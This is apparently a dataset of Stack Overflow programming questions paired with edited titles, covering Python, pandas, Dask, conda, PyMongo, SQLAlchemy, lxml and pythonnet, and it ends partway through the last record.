Python: How to convert millisecond time stamp to normal date?, I have a data frame with a column with values in millisecond time stamp.(df['Millisecond'])What I want to do is to convert all values of that column into normal dates. Ex. 2017-04-27 04:55:00 <code> ,How to convert millisecond time stamp to normal date in Python?
xml2: generate dataframe from XML when not all nodes contain all variables?," Consider the following XML example Here I would like to get an (R or Pandas) dataframe from this XML that contains the columns name and hobby. However, as you see, there is an alignment problem because hobby is missing in the second node and John has two hobbies.in R, I know how to extract specific values one at a time, for instance using xml2 as follows: but how can I align this data correctly in a dataframe? That is, how can I obtain a dataframe as follows (note how I join with a | the two hobbies of John): In R, I would prefer a solution using xml2 and dplyr. In Python, I want to end-up with a Pandas dataframe. Also, in my xml there are many more variables I want to parse. I would like a solution that has allows the user to parse additional variables without messing too much with the code.Thanks!EDIT: thanks to everyone for these great solutions. All of them were really nice, with plenty of details and it was hard to pick up the best one. Thanks again! <code>  library(xml2)myxml <- read_xml('<data> <obs ID=""a""> <name> John </name> <hobby> tennis </hobby> <hobby> golf </hobby> <skill> python </skill> </obs> <obs ID=""b""> <name> Robert </name> <skill> R </skill> </obs> </data>') myxml%>% xml_find_all(""//name"") %>% xml_text()myxml%>% xml_find_all(""//hobby"") %>% xml_text() # A tibble: 2 3 name hobby skill <chr> <chr> <chr>1 John tennis|golf python2 Robert <NA> R",Python/R: generate dataframe from XML when not all nodes contain all variables?
Save panda blxplot as an image," I'm trying to save a pandas.DataFrame.boxplot variable to a image to use it with a Qt widget, but I don't know how to convert this variable. I have this code: And Spyder shows it:Are there instructions to do it automatically within the code? <code>  import matplotlib.pyplot as pltfrom pandas import DataFrameimport numpy as npdf = DataFrame(np.random.rand(10,5))plt.figure();bp = df.boxplot()",Save panda boxplot as image
is there a golang terminal shell? is it possible for a compiled language?," Recently I'm interested in Golang. When I was learning Python I kicked off a terminal shell and just practised throwing it different data, files, making many trivial silly operations, it's such a nice way to interact with a new language and it's super helpful for writing new programs. I wonder- I guess because Golang is a compiled language like Java it's not possible to have such a terminal shell. Is that right? If so- what's the real technical reason why it can't work? <code> ",Is there a Golang terminal shell? Is it possible for a compiled language?
Unexpected memory behavior of Dask distributed," Similar to this question, I'm running into memory issues with Dask distributed. However, in my case the explanation is not that the client is trying to collect a large amount of data.The problem can be illustrated based on a very simple task graph: A list of delayed operations generate some random DataFrames of a fixed size of ~500 MB (to simulate loading many partitions from files). The next operation in the task graph is to take the size of each DataFrame. Finally all sizes are reduced into one total size, i.e., the data that has to be returned to the client is small.For testing purposes, I'm running a local scheduler/worker single-threaded, limited to 2GB memory, i.e.: My expectation from the task graph is that the worker should never need much more than 500 MB of RAM, because running ""get data size"" directly after ""generate data"" should make the data small immediately. However, I'm observing that the worker needs much more memory than that:The factor of 2 indicates that the data has to be duplicated internally. Therefore any attempts to bring the partition size close to the physical memory of a node results in MemoryErrors or heavy swapping.Any information to shed some light on this is highly appreciated. In particular:Do I have any control over the duplication of the data, and is it something that can be avoided? Or is the general rule of thumb to keep the payload well below 50% to account for the data duplication?How does the worker memory-limit affect this behavior? From my tests, using a lower threshold seems to trigger GC earlier (and/or spill-to-disk?), but on the other hand there are other memory peaks which even exceed the peak memory of using a higher threshold.Note that I'm aware that I could solve this particular issue by taking the size within the first operation, and probably Dask's single machine executor is better suited for the problem, but I'm asking for educational purposes.Attachment 1: Test code Attachment 2: DAG illustration <code>  $ dask-scheduler$ dask-worker localhost:8786 --nthreads 1 --memory-limit 2000000000 from __future__ import division, print_functionimport pandas as pdimport numpy as npfrom dask import delayedfrom dask.distributed import Client, Executordef simulate_df_partition_load(part_id): """""" Creates a random DataFrame of ~500 MB """""" num_rows = 5000000 num_cols = 13 df = pd.DataFrame() for i in xrange(num_cols): data_col = np.random.uniform(0, 1, num_rows) df[""col_{}"".format(i)] = data_col del data_col # for max GC-friendliness print(""[Partition {}] #rows: {}, #cols: {}, memory: {} MB"".format( part_id, df.shape[0], df.shape[1], df.memory_usage().sum() / (2 ** 20) )) return dfe = Executor('127.0.0.1:8786', set_as_default=True)num_partitions = 2lazy_dataframes = [ delayed(simulate_df_partition_load)(part_id) for part_id in xrange(num_partitions)]length_partitions = [df.shape[0] for df in lazy_dataframes]dag = delayed(sum)(length_partitions)length_total = dag.compute()",Understanding memory behavior of Dask distributed
How to access a column in a list of lists in pyton," I have a 2D array in python modeled by a list of lists and I want to extract the column. I made a quick research and I found a way that uses numpy arrays. The problem is that I do not want to use numpy so I don't want to convert my list of lists into a numpy array and then use [:,1] syntax. I tried using it on a normal list of lists but it shows an error so it's not possible. I am asking for a similar thing for list of lists without having to go through each element(In numpy arrays, it's faster to access a column by using [:,1] syntax than iterating over the elements of the array).I found this link but again it suggests iterating over elements without a shortcut.Thanks in advance. <code> ",How to access a column in a list of lists in python
Python detect logfile rotation," I use the following code to track ssh log-ins: I've noticed that this script suddenly stops working after a couple of days. I don't get any error, it doesn't terminate, it just stops working, as if readline() would never return.So I executed a echo 'test' >> auth.log.1 and this indeed ends up getting processed by the script, because sometime ago auth.log got renamed to auth.log.1How can I track when such a log rotation happens and adjust accordingly? <code>  def follow(thefile): thefile.seek(0,2) while True: line = thefile.readline() if not line: time.sleep(0.1) continue yield lineif __name__ == '__main__': logfile = open('/var/log/auth.log', 'r') loglines = follow(logfile) for line in loglines: print 'do something here'",Detect log file rotation (while watching log file for modification)
Python: Detect log file rotation (while watching log file for modification)," I use the following code to track ssh log-ins: I've noticed that this script suddenly stops working after a couple of days. I don't get any error, it doesn't terminate, it just stops working, as if readline() would never return.So I executed a echo 'test' >> auth.log.1 and this indeed ends up getting processed by the script, because sometime ago auth.log got renamed to auth.log.1How can I track when such a log rotation happens and adjust accordingly? <code>  def follow(thefile): thefile.seek(0,2) while True: line = thefile.readline() if not line: time.sleep(0.1) continue yield lineif __name__ == '__main__': logfile = open('/var/log/auth.log', 'r') loglines = follow(logfile) for line in loglines: print 'do something here'",Detect log file rotation (while watching log file for modification)
"""No module named tensorflow"" while using Keras in Anaconda Environment"," I have installed Keras and tensorflow using pip in Anaconda environment, but when I run Keras program in tensorflow background it gives error No module named tensorflow. Can you please help? <code> ","ImportError: ""No module named tensorflow"" (Keras in Anaconda environment)"
Python for .NET doesn't work when trying to embed Python," I'm trying to embed Python in my .NET application.I'm using Python 3.6.1 64-bit on Windows 10 and I have installed pythonnet 2.3.0 from PyPi using pip.I've referenced Python.Runtime.dll from C:\Program Files\Python36\Lib\site-packages and have both Path and PYTHONHOME environment variables pointed to C:\Program Files\Python36\.When I use .NET in Python everything is OK. prints {X=5,Y=5} as expected.But when I call Python from .NET I get System.BadImageFormatException. For example, when calling Python.Runtime.PythonEngine.Initialize(); : System.BadImageFormatException: 'Could not load file or assembly 'Python.Runtime, Version=2.3.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format.'Any thoughts?Thanks in advance. <code>  import clrfrom System.Drawing import Pointp = Point(5, 5)print(p)",Python for .NET: System.BadImageFormatException when embedding
Does the order of method writing in a Python script matter?," Let's say I have two functions in my script: sum_numbers and print_sum. Their implementation is like this: So my question is: does the order in which the function are written matter? If I had written the print_sum function first and then the sum_numbers, would the code still work? If the answer is yes, does it always work? <code>  def sum_numbers(a, b): return a + bdef print_sum(a, b): print(sum_numbers(a, b))",Does the order of functions in a Python script matter?
How to json.dumps byte object in python3," In python2 I want to get same 'Out' in python3: In Python3, If there is a way to convert to <code>  import jsona = {""text"": u"""".encode(""gbk"")}json.dumps(a, ensure_ascii=False)>>> Out: '{""text"": ""\xc4\xe3\xba\xc3""}' import codecsbyte_obj = """".encode(""gbk"")x = byte_obj.decode(""utf8"", ""backslashreplace"") # ops, it become '\\xc4\\xe3\\xba\\xc3'x = codecs.escape_encode(byte_obj)[0] # ops, it become b'\\xc4\\xe3\\xba\\xc3'# fail, I have to concatenate themb'{""text"": ""' + u"""".encode(""gbk"") + b'""}'>>> Out: b'{""text"": ""\xc4\xe3\xba\xc3""}' {""text"": """"} # first, encoding with gbk, then json.dumps b'{""text"": ""\xc4\xe3\xba\xc3""}' # json serialized result",How to json.dumps byte object in python3
How to dump json serialized byte object in python3," In python2 I want to get same 'Out' in python3: In Python3, If there is a way to convert to <code>  import jsona = {""text"": u"""".encode(""gbk"")}json.dumps(a, ensure_ascii=False)>>> Out: '{""text"": ""\xc4\xe3\xba\xc3""}' import codecsbyte_obj = """".encode(""gbk"")x = byte_obj.decode(""utf8"", ""backslashreplace"") # ops, it become '\\xc4\\xe3\\xba\\xc3'x = codecs.escape_encode(byte_obj)[0] # ops, it become b'\\xc4\\xe3\\xba\\xc3'# fail, I have to concatenate themb'{""text"": ""' + u"""".encode(""gbk"") + b'""}'>>> Out: b'{""text"": ""\xc4\xe3\xba\xc3""}' {""text"": """"} # first, encoding with gbk, then json.dumps b'{""text"": ""\xc4\xe3\xba\xc3""}' # json serialized result",How to json.dumps byte object in python3
Plotting heatmap for 3 columns in python," In the dataframe above, I want to plot a heatmap using v1 and v2 as x and y axis and yy as the value. How can I do that in python? I tried seaborn: However, this does not work. Any other solution? <code>  v1 v2 yy15.25 44.34 100.0083.05 59.78 100.0096.61 65.09 100.00100.00 75.47 100.00100.00 50.00 100.00100.00 68.87 100.00100.00 79.35 100.00100.00 100.00 100.00100.00 63.21 100.00100.00 100.00 100.00100.00 68.87 100.000.00 56.52 92.8610.17 52.83 92.8623.73 46.23 92.86 df = df.pivot('v1', 'v2', 'yy')ax = sns.heatmap(df)",Plotting heatmap for 3 columns in python with seaborn
Selenium python: How to stop page loading when certain element gets loaded?," The implicit and explicit waits can be used when the page uses AJAX, but I want to stop the loading caused by driver.get() when sufficient elements are loaded. Is it possible to do so because of the driver.get() call returns only when the page finishes loading. <code> ",Selenium + Python: How to stop page loading when certain element gets loaded?
'Conda' is not recognized as internal or external command," I installed Anaconda3 4.4.0 (32 bit) on my Windows 7 Professional machine and imported NumPy and Pandas on Jupyter notebook so I assume Python was installed correctly. But when I type conda list and conda --version in command prompt, it says conda is not recognized as internal or external command.I have set environment variable for Anaconda3; Variable Name: Path, Variable Value: C:\Users\dipanwita.neogy\Anaconda3How do I make it work? <code> ",SOLVED - 'Conda' is not recognized as internal or external command
"Is it possible to access a private s3 bucket objects without using a pre-signed ur?l (boto3, python)"," My code accesses a PDF file in an Amazon S3 bucket (not public) by generating a pre-signed url and pass the generated URL into PDF.js to view it in the browser.I'm having a problem in which I have to generate a pre-signed url every time I access the PDF file, and I find this cumbersome. My solution for now is to save the pre-signed URL into database and check it, if it has expired or not. If it has expired, then generate a new URL, otherwise use the existing URL. My question: Is it possible to access an object without using pre-signed URL? <code> ","Is it possible to access a private s3 bucket objects without using a pre-signed URL? (boto3, python)"
conda command is not recognized on windows 10," I installed Anaconda 4.4.0 (Python 3.6 version) on Windows 10 by following the instructions here: https://www.continuum.io/downloads. However, when I open the Command prompt window and try to write I get the 'conda' command is not recognized...error. I tried to run but it didn't help. I also read that I might need to edit my .bashrc file, but I don't know how to access this file, and how I should edit it.  <code>  conda list set PATH=%PATH%;C:\Users\Alex\Anaconda3",Conda command is not recognized on Windows 10
How to display a Pandas data frame with PyQt5," I have a problem with the line below self.tableView.set??????????(df) that supposed to display the data frame in PyQt5. I put ??? there where I am missing the code I need. The rest of the code works, because if I use print(df) in the above code, the data frame is printed in the IPython console. So, Pandas reads the CSV and prints it.But, I tried many things to get it displayed in PyQt5 and nothing works. I am not very familiar with PyQt, just started to play around with it and I am stuck here.Here is my code: <code>  def btn_clk(self): path = self.lineEdit.text() df = pd.read_csv(path) self.tableView.set??????????(df) from PyQt5 import QtCore, QtGui, QtWidgetsimport pandas as pdclass Ui_MainWindow(object): def setupUi(self, MainWindow): MainWindow.setObjectName(""MainWindow"") MainWindow.resize(662, 512) self.centralwidget = QtWidgets.QWidget(MainWindow) self.centralwidget.setObjectName(""centralwidget"") self.horizontalLayout = QtWidgets.QHBoxLayout(self.centralwidget) self.horizontalLayout.setObjectName(""horizontalLayout"") self.verticalLayout = QtWidgets.QVBoxLayout() self.verticalLayout.setObjectName(""verticalLayout"") self.lineEdit = QtWidgets.QLineEdit(self.centralwidget) self.lineEdit.setObjectName(""lineEdit"") self.verticalLayout.addWidget(self.lineEdit) self.tableView = QtWidgets.QTableView(self.centralwidget) self.tableView.setObjectName(""tableView"") self.verticalLayout.addWidget(self.tableView) self.pushButton = QtWidgets.QPushButton(self.centralwidget) self.pushButton.setObjectName(""pushButton"") self.verticalLayout.addWidget(self.pushButton) self.horizontalLayout.addLayout(self.verticalLayout) MainWindow.setCentralWidget(self.centralwidget) self.menubar = QtWidgets.QMenuBar(MainWindow) self.menubar.setGeometry(QtCore.QRect(0, 0, 662, 21)) self.menubar.setObjectName(""menubar"") MainWindow.setMenuBar(self.menubar) self.statusbar = QtWidgets.QStatusBar(MainWindow) self.statusbar.setObjectName(""statusbar"") MainWindow.setStatusBar(self.statusbar) self.retranslateUi(MainWindow) QtCore.QMetaObject.connectSlotsByName(MainWindow) def retranslateUi(self, MainWindow): _translate = QtCore.QCoreApplication.translate MainWindow.setWindowTitle(_translate(""MainWindow"", ""MainWindow"")) self.pushButton.setText(_translate(""MainWindow"", ""PushButton"")) self.pushButton.clicked.connect(self.btn_clk) MainWindow.show() def btn_clk(self): path = self.lineEdit.text() df = pd.read_csv(path) self.tableView.set????????????(df)if __name__ == ""__main__"": import sys app = QtWidgets.QApplication(sys.argv) MainWindow = QtWidgets.QMainWindow() ui = Ui_MainWindow() ui.setupUi(MainWindow) MainWindow.show() sys.exit(app.exec_())",How to display a Pandas data frame with PyQt5/PySide2
When is a variable considered constant?," In keeping with PEP8 conventions, in a .py I can define constants as: If a .txt contained Me Old Male on a single line, and in another .py I performed: Question(s):Can content and data be considered constants? To be constant, must a variable be declared as a constant at build?Or is constant vice variable a function of the ability to be altered by user input in runtime?Supporting Informaton:content is what is in the file, but it is subject to .rstrip() and .split() but it as a whole is never changed later. data is made from content, which hasn't changed and wont, and is subject to .join(). Neither values change after they are initialized.I would view this similar to: Assuming the program has terminated and TOTAL is never altered, I would consider this value a constant. Again under the presumption that any variable that is not alterable during runtime is to be considered a constant.Feel free to alter my notions as required to align with standards! <code>  NAME = ""Me""AGE = ""Old""GENER = ""Male"" FILE = ""C:/path/to/file.txt"" # a declared constant, easywith open(FILE, 'r') as f: content = f.read().rstrip('\n').split() data = ','.join(content) # returns Me,Old,Male >>> A = 2 # a declared constant>>> B = 2 # another declared constant>>> TOTAL = A + B # 'caps' per PEP8 for constant naming4",When is a variable considered constant in terms of PEP8 naming styles?
Filter elements from a collection using minimum threshold in Python," After trying to count the occurrences of an element in a list using the below code After calling Counter on A above, a counter object like this is formed: From here, how do I filter only 'a' and 'b' using minimum threshold value of 3? <code>  from collections import CounterA = ['a','a','a','b','c','b','c','b','a']A = Counter(A)min_threshold = 3 >>> ACounter({'a': 4, 'b': 3, 'c': 2})",Filter out elements that occur less times than a minimum threshold
running python script in interactive python prompt?," I understand from How do I run a Python program? that in command prompt i can use , to run first.py. But, is it possible, that after i entered the interactive python prompt, by runnning and see the >>> python indication, run first.py, and after finished running first.py, back to the interactive python prompt, I could see variables defined inside first.py?For example, if first.py created some variables inside, e.g. by , is it possible that after running first.py and back to the interactive python prompt, x and y are still there?Running windows shell commands with python shows how to run the windows shell command in python, so in the interactive python prompt, i could actually use to run first.py, but x and y defined inside are lost after running. <code>  C:\python>python first.py C:\python>python (x,y) = [3,5] >>>os.system('python first.py')",running python script in interactive python prompt and keep the variables?
Selenium - move_to_element do not work on Firefox," I'v got problem with function move_to_element on Firefox Webdriver (Chrome, IE works well) I am working with these versions: geckodriver - 0.17.0 // Firefox - 54.0 // selenium - 3.4.3After running this script, on output shows: <code>  driver = webdriver.Firefox()driver.get(""https://stackoverflow.com"")time.sleep(5)source_element = driver.find_element_by_xpath('//*[@id=""footer""]/div/ul/li[1]/a')ActionChains(driver).move_to_element(source_element).perform() selenium.common.exceptions.MoveTargetOutOfBoundsException: Message: (134.96666717529297, 8682.183013916016) is out of bounds of viewport width (1268) and height (854) ",Selenium - MoveTargetOutOfBoundsException with Firefox
pymongo: how to ignore duplicates (based on index) when using insert_many," I need to ignore duplicate inserts when using insert_many with pymongo, where the duplicates are based on the index. I've seen this question asked on stackoverflow, but I haven't seen a useful answer.Here's my code snippet: I would like the insert_many to ignore duplicates and not throw an exception (which fills up my error logs). Alternatively, is there a separate exception handler I could use, so that I can just ignore the errors. I miss ""w=0""...Thanks <code>  try: results = mongo_connection[db][collection].insert_many(documents, ordered=False, bypass_document_validation=True)except pymongo.errors.BulkWriteError as e: logger.error(e)",How to Ignore Duplicate Key Errors Safely Using insert_many
How to ignore duplicates (based on index) when using insert_many," I need to ignore duplicate inserts when using insert_many with pymongo, where the duplicates are based on the index. I've seen this question asked on stackoverflow, but I haven't seen a useful answer.Here's my code snippet: I would like the insert_many to ignore duplicates and not throw an exception (which fills up my error logs). Alternatively, is there a separate exception handler I could use, so that I can just ignore the errors. I miss ""w=0""...Thanks <code>  try: results = mongo_connection[db][collection].insert_many(documents, ordered=False, bypass_document_validation=True)except pymongo.errors.BulkWriteError as e: logger.error(e)",How to Ignore Duplicate Key Errors Safely Using insert_many
python modify list while iterating," I know you should not add/remove items while iterating over a list. But can I modify an item in a list I'm iterating over if I do not change the list length? Or should I iterate over the list indices instead? Like that: The question is: are the both ways above allowed or only the second one is error-free?If the answer is yes, will the following snippet be valid? UPD. I'd like to see the python documentation where it says ""these operations are allowed"" rather than someone's assumptions. <code>  class Car(object): def __init__(self, name): self.name = name def __repr__(self): return type(self).__name__ + ""_"" + self.namemy_cars = [Car(""Ferrari""), Car(""Mercedes""), Car(""BMW"")]print(my_cars) # [Car_Ferrari, Car_Mercedes, Car_BMW]for car in my_cars: car.name = ""Moskvich""print(my_cars) # [Car_Moskvich, Car_Moskvich, Car_Moskvich] for car_id in range(len(my_cars)): my_cars[car_id].name = ""Moskvich"" lovely_numbers = [[41, 32, 17], [26, 55]]for numbers_pair in lovely_numbers: numbers_pair.pop()print(lovely_numbers) # [[41, 32], [26]]",Modify a Python list while iterating
Python: Modify a list while iterating," I know you should not add/remove items while iterating over a list. But can I modify an item in a list I'm iterating over if I do not change the list length? Or should I iterate over the list indices instead? Like that: The question is: are the both ways above allowed or only the second one is error-free?If the answer is yes, will the following snippet be valid? UPD. I'd like to see the python documentation where it says ""these operations are allowed"" rather than someone's assumptions. <code>  class Car(object): def __init__(self, name): self.name = name def __repr__(self): return type(self).__name__ + ""_"" + self.namemy_cars = [Car(""Ferrari""), Car(""Mercedes""), Car(""BMW"")]print(my_cars) # [Car_Ferrari, Car_Mercedes, Car_BMW]for car in my_cars: car.name = ""Moskvich""print(my_cars) # [Car_Moskvich, Car_Moskvich, Car_Moskvich] for car_id in range(len(my_cars)): my_cars[car_id].name = ""Moskvich"" lovely_numbers = [[41, 32, 17], [26, 55]]for numbers_pair in lovely_numbers: numbers_pair.pop()print(lovely_numbers) # [[41, 32], [26]]",Modify a Python list while iterating
Modify a list while iterating," I know you should not add/remove items while iterating over a list. But can I modify an item in a list I'm iterating over if I do not change the list length? Or should I iterate over the list indices instead? Like that: The question is: are the both ways above allowed or only the second one is error-free?If the answer is yes, will the following snippet be valid? UPD. I'd like to see the python documentation where it says ""these operations are allowed"" rather than someone's assumptions. <code>  class Car(object): def __init__(self, name): self.name = name def __repr__(self): return type(self).__name__ + ""_"" + self.namemy_cars = [Car(""Ferrari""), Car(""Mercedes""), Car(""BMW"")]print(my_cars) # [Car_Ferrari, Car_Mercedes, Car_BMW]for car in my_cars: car.name = ""Moskvich""print(my_cars) # [Car_Moskvich, Car_Moskvich, Car_Moskvich] for car_id in range(len(my_cars)): my_cars[car_id].name = ""Moskvich"" lovely_numbers = [[41, 32, 17], [26, 55]]for numbers_pair in lovely_numbers: numbers_pair.pop()print(lovely_numbers) # [[41, 32], [26]]",Modify a Python list while iterating
"SQLAlchemy ""excluded"" PostrgeSQL namespace in INSERT ... ON CONFLICT"," I can't find a way to execute PostgreSQL INSERT .. ON UPDATE through SQLAlchemy.Is there a way to do it with multiple rows, performing the operation on the whole data at once?I try to upsert with values from a pandas dataframe: This works on a row basis and as every row is handled separately - it works terribly slow (20 minutes for 7000 rows).Is there a way to perform this operation as a single SQL statement?I am looking for some kind of an opportunity to pass parameters like {'column_name':'excluded .column_name'} to the update part of the statement, where ""excluded"" won't be parsed as a part of the string value, but rather as a SQL literal. Is there a way to do this? <code>  for insert_values in df.to_dict(orient='records'): insert_statement = sqlalchemy.dialects.postgresql.insert(orders_to_channels).values(insert_values) upsert_statement = insert_statement.on_conflict_do_update( constraint='orders_to_channels_pkey', set_=insert_values conn.execute(upsert)","SQLAlchemy ""excluded"" PostgreSQL namespace in INSERT ... ON CONFLICT"
Do I need __init__.py at every level?," Given that I have the following directory structure with . being the current working directory When I run python -c ""import foo.bar.baz"" I get If I echo """" > foo/__init__.py, the above command works.Am I doing something wrong or do I misunderstand the point of __init__.py? I thought it was to stop modules existing where they shouldn't, e.g. a directory named string, but if you replace foo with string in my example, I'm seemingly forced to create the module that should never be used, just so I can reference a file deeper in the hierarchy.UpdateI'm working with a build system that's generating the __init__.py's for me and is enforcing the directory structure and while I could mess with the hierarchy, I'd prefer to just add the __init__.py myself. To change the question slightly, why do I need a python package at every level instead of just at the top? Is it just a rule that you can only import modules from the python path or from a chain of packages off of the python path? <code>  .\---foo \---bar \---__init__.py \---baz.py Traceback (most recent call last): File ""<string>"", line 1ImportError: No module named foo.bar.baz",Why do I need __init__.py at every level?
"subprocess ""TypeError: a bytes-like object is required, not 'str'"" (Python 2 -> 3 issue maybe?)"," I'm using this code from a previously asked question a few years ago, however, I believe this is outdated. Trying to run the code, I receive the error above. I'm still a novice in Python, so I could not get much clarification from similar questions. Does anyone know why this is happening? Traceback <code>  import subprocessdef getLength(filename): result = subprocess.Popen([""ffprobe"", filename], stdout = subprocess.PIPE, stderr = subprocess.STDOUT) return [x for x in result.stdout.readlines() if ""Duration"" in x]print(getLength('bell.mp4')) Traceback (most recent call last): File ""B:\Program Files\ffmpeg\bin\test3.py"", line 7, in <module> print(getLength('bell.mp4')) File ""B:\Program Files\ffmpeg\bin\test3.py"", line 6, in getLength return [x for x in result.stdout.readlines() if ""Duration"" in x] File ""B:\Program Files\ffmpeg\bin\test3.py"", line 6, in <listcomp> return [x for x in result.stdout.readlines() if ""Duration"" in x]TypeError: a bytes-like object is required, not 'str'","subprocess ""TypeError: a bytes-like object is required, not 'str'"""
How i can convert from bytes object to decimal or binary representation in python?," I wanted to convert an object of type bytes to binary representation in python 3.x.For example, I want to convert the bytes object b'\x11' to the binary representation 00010001 in binary (or 17 in decimal).I tried this: But I'm getting: <code>  print(struct.unpack(""h"",""\x11"")) error struct.error: unpack requires a bytes object of length 2",How can I convert bytes object to decimal or binary representation in python?
Difference between axis('equal') and axis('scaled') in python matplotlib.pyplot," In the reference, they are described as: axis('equal') changes limits of x or y axis so that equal increments of x and y have the same length; a circle is circular.: axis('scaled') achieves the same result by changing the dimensions of the plot box instead of the axis data limits.:But I did not understand the part 'by changing the dimensions of the plot box'.So I compared directly There is only a slight difference that the width is shorter when plotted with plt.axis('scaled').How can I know the difference better? <code>  import numpy as npimport matplotlib.pyplot as pltplt.close('all')x = np.array(np.linspace(-np.pi, np.pi))y = np.sin(x)ax1 = plt.subplot(2, 1, 1)ax1 = plt.plot(x, y)plt.axis('scaled')ax1 = plt.subplot(2, 1, 2)plt.plot(x, y)plt.axis('equal')",Difference between axis('equal') and axis('scaled') in matplotlib
python struct pack return is too long," I'm trying to use the struct.pack function and it gives me this output: while the python docs say: so len() should be 2 + 4 = 6, and I need bytes with size = 6Any ideas? I'm using Python 3.6 on Windows 10 <code>  import structvalues = (0, 44)s = struct.Struct('HI')b = s.pack(*values)print(b)print(str(len(b))) b'\x00\x00\x00\x00,\x00\x00\x00'8 Format - C Type - Python type - Standard size - NotesH - unsigned short - integer - 2 - (3)I - unsigned int - integer - 4 - (3)",struct pack return is too long
aiohttp module import error," Installed aiohttp, as mentioned hereWith python3.6,I see below error: How to resolve this error? <code>  pip3 install aiohttp import aiohttpModuleNotFoundError: No module named 'aiohttp'",aiohttp module - import error
python process 4 list element together," I have sequence of played cards in a list. There were 4 players, so each four elements in the list represent a single trick. I have to process 4 cards together to find trick winner. I need to split the list four elements at a time. I am currently doing the following: I think that I can do better than this using power of python. Can I access 4 cards together in a loop? Can any one help me to make my code more Pythonic? <code>  cardSequnce = [ 'D7', 'D8', 'DT', 'DA', 'H2', 'H7', 'HK', 'H5', 'H3', 'HT', 'HA', 'HQ', 'H8', 'D2', 'H4', 'HJ', 'D6', 'D3']four_card = []for index, card in enumerate(cardSequnce): if(index % 4 == 0): # process four_card four_card = [] four_card.append(card)",python process list elements in batches
convert pyspark dataframe column from list to string," I have this PySpark dataframe and I want to convert the column test_123 to be like this: so from list to be string.how can I do it with PySpark?  <code>  +-----------+--------------------+|uuid | test_123 | +-----------+--------------------+| 1 |[test, test2, test3]|| 2 |[test4, test, test6]|| 3 |[test6, test9, t55o]| +-----------+--------------------+|uuid | test_123 | +-----------+--------------------+| 1 |""test,test2,test3"" || 2 |""test4,test,test6"" || 3 |""test6,test9,t55o"" |",Convert PySpark dataframe column from list to string
NLP: How to extract numbers (along with comparsion adjectives or ranges)," I am working on two NLP projects in Python, and both have a similar task to extract numerical values and comparison operators from sentences, like the following: I found two different approaches to solve this problem:using very complex regular expressions.using Named Entity Recognition (and some regexes, too).How can I parse numerical values out of such sentences? I assume this is a common task in NLP.The desired output would be something like:Input: ""greater than $10""Output: <code>  ""... greater than $10 ... "",""... weight not more than 200lbs ..."",""... height in 5-7 feets ..."",""... faster than 30 seconds ... "" {'value': 10, 'unit': 'dollar', 'relation': 'gt', 'position': 3}",How to extract numbers (along with comparison adjectives or ranges)
ElementTree link in a table made from the list," I am building HTML table from the list through lxml.builder and striving to make a link in one of the table cellsList is generated in a following way: HTML file which I parse is the same that is generated further by lxml, i.e. I set up some sort of recursion for testing purposes.And here is how I build table When I specify link via literals all is going fine. However, when I try to output list element value (which is https://blahblahblah.com) as a link cell is empty, just nothing is showed in the cell.If I specify link text as a literal and put str (col) into href, the link is showed normally, but instead of real href it contains the name of the generated html file.If I output just that col value as a string it is showed normally, i.e. it is not empty. What is wrong with E.a and E.img elements?Just noticed that this happens only if I build list from html file. When I build list manually, like this, all is output fine. Current output (pay attention to <a> and <href> tags) Desired output <code>  with open('some_file.html', 'r') as f: table = etree.parse(f)p_list = list()rows = table.iter('div')p_list.append([c.text for c in rows])rows = table.xpath(""body/table"")[0].findall(""tr"")for row in rows[2:]: p_list.append([c.text for c in row.getchildren()]) from lxml.builder import Epage = (E.html( E.head( E.title(""title"") ), E.body( ....*[E.tr( *[ E.td(E.a(E.img(src=str(col)))) if ind == 8 else E.td(E.a(str(col), href=str(col))) if ind == 9 else E.td(str(col)) for ind, col in enumerate(row) ]) for row in p_list ] E.td(E.a(""link"", href=""url_address"")) E.td(E.a(str(col), href=str(col))) E.td(str(col)) p_list = []p_element = ['id']p_element.append('value')p_element.append('value2')p_list.append(p_element) <html> <head> <title>page</title> </head>",String variable as href in lxml.builder
Literal works as href while string var doesn't in lxml.builder," I am building HTML table from the list through lxml.builder and striving to make a link in one of the table cellsList is generated in a following way: HTML file which I parse is the same that is generated further by lxml, i.e. I set up some sort of recursion for testing purposes.And here is how I build table When I specify link via literals all is going fine. However, when I try to output list element value (which is https://blahblahblah.com) as a link cell is empty, just nothing is showed in the cell.If I specify link text as a literal and put str (col) into href, the link is showed normally, but instead of real href it contains the name of the generated html file.If I output just that col value as a string it is showed normally, i.e. it is not empty. What is wrong with E.a and E.img elements?Just noticed that this happens only if I build list from html file. When I build list manually, like this, all is output fine. Current output (pay attention to <a> and <href> tags) Desired output <code>  with open('some_file.html', 'r') as f: table = etree.parse(f)p_list = list()rows = table.iter('div')p_list.append([c.text for c in rows])rows = table.xpath(""body/table"")[0].findall(""tr"")for row in rows[2:]: p_list.append([c.text for c in row.getchildren()]) from lxml.builder import Epage = (E.html( E.head( E.title(""title"") ), E.body( ....*[E.tr( *[ E.td(E.a(E.img(src=str(col)))) if ind == 8 else E.td(E.a(str(col), href=str(col))) if ind == 9 else E.td(str(col)) for ind, col in enumerate(row) ]) for row in p_list ] E.td(E.a(""link"", href=""url_address"")) E.td(E.a(str(col), href=str(col))) E.td(str(col)) p_list = []p_element = ['id']p_element.append('value')p_element.append('value2')p_list.append(p_element) <html> <head> <title>page</title> </head>",String variable as href in lxml.builder
calling C# code from python," Following is the C# code. How do I call the GenericMethod() inside the NonGenericClass from Python using pythonnet? Python code that I tried: Error that I got: <code>  namespace CSharpTestCode{ public interface Person { } public class Employee : Person { } public class TempGenericClass<T> { } public class NonGenericClass { public static T GenericMethod<T>(TempGenericClass<T> tempGeneric) where T : class, Person { return null; } }} import clrclr.AddReference(r'\Documents\visual studio 2015\Projects\SamplePythonApp\CSharpTestCode\bin\Debug\CSharpTestCode.dll')from CSharpTestCode import *genericMethod = NonGenericClass.GenericMethod(TempGenericClass[Employee]()) Unhandled Exception: System.ArgumentException: GenericArguments[0], 'CSharpTestCode.TempGenericClass`1[CSharpTestCode.Employee]', on 'T GenericMethod[T](CSharpTestCode.TempGenericClass`1[T])' violates the constraint of type 'T'. ---> System.Security.VerificationException: Method CSharpTestCode.NonGenericClass.GenericMethod: type argument 'CSharpTestCode.TempGenericClass`1[CSharpTestCode.Employee]' violates the constraint of type parameter 'T'. at System.RuntimeMethodHandle.GetStubIfNeeded(RuntimeMethodHandleInternal method, RuntimeType declaringType, RuntimeType[] methodInstantiation) at System.Reflection.RuntimeMethodInfo.MakeGenericMethod(Type[] methodInstantiation) --- End of inner exception stack trace --- at 